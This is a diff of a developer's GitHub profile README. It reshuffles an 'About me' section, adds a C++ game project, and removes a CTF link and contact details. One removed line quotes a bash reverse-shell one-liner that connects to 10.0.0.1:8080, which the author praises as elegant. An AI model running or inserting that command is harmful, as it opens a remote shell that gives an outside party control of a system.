@@ -1,11 +1,10 @@
 <p align="left"> <img src="https://komarev.com/ghpvc/?username=marc-gav&label=Profile%20views&color=0e75b6&style=flat" alt="marc-gav" /> </p>
 
 ## About me
-Probably my favourite thing about technology is the concept of hacking: "Playful solving of technical work that requires deep understanding, especially of a computer system."
+Probably my favourite thing about technology is the concept of hacking: "Playful solving of technical work that requires deep understanding, especially of a computer system." I am currenly learning about the Linux kernel, reverse engineering and network protocols.
 
-In my free time I like to get increasingly deep understanding of different technologies and apply it to solving CTF challenges: You can find some of my solutions in this repo: https://github.com/marc-gav/picoCTF_solutions. I stopped adding new solutions because honestly you can find better write-ups for picoCTF on youtube from people that know more than me.
-
-I am currenly learning about the Linux kernel, reverse engineering and network protocols. Slightly unrelated, after a couple years of using bash I discovered this snippet of code: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`. I think it's beautiful to think of the different ideas that need to come together into one single bash command to form a reverse shell.
+## Working on
+Pokemon Red inspired game in C++: https://github.com/PrettyHackyDevs/Re-Pokemon-Red. Feel free to contribute if you like it.
 
 ## Previously working on
 
@@ -17,8 +16,3 @@ I am currenly learning about the Linux kernel, reverse engineering and network p
   - 2019: (Python): https://github.com/marc-gav/Advent_code_19
 - In 2022 I worked on my Master's thesis in NLP (Natural Language Processing, Machine Learning). You can read more about it here: https://github.com/marc-gav/MasterThesis
 - During 2017/18/19 I participated in various game development projects and Game Jams. The most advanced game my team and I created was Aqueron: https://github.com/marc-gav/cdvAqueron
-
-## 📫 How to reach me.
-Add this code to your message so I have a bit more confidence that you are not spam: **MJzwT3Bk**
-- **https://www.linkedin.com/in/marcgavilangil/**
-- **marcgavilangil@gmail.com**
